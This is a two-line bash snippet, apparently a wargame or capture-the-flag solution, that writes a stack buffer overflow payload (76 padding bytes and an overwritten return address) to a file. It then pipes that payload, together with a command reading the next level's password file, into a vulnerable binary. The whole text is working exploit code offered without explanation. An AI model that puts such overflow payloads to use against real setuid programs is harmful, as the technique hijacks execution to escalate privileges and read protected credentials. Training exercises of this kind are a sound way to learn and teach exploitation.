```bash
python -c "print('A'*76 + '\x4a\x84\x04\x08')" > /tmp/input
(cat /tmp/input; echo "cat /home/user/level2/.pass") | ./level1
```